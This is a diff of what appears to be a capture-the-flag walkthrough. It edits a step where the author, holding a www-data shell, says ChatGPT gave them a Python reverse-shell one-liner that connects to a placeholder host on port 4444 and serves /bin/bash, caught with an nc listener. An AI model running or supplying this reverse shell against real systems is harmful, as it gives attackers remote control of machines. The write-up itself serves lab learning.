@@ -39,13 +39,14 @@ Nice , we got shell and we are __www-data__
 
 I asked ChatGPT to give me a command for a reverse shell:
 ```
-python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 
 ```
 After this I put an nc to listen on 4444 and try it 
 
 
-![image](https://github.com/user-attachments/assets/295c6e61-ae80-4146-9862-b30b4c75ed5c)
+![image](https://github.com/user-attachments/assets/e968b8b6-b98e-484c-863f-c6410c5179f9)
+
 
 Some research and I find this: 
 
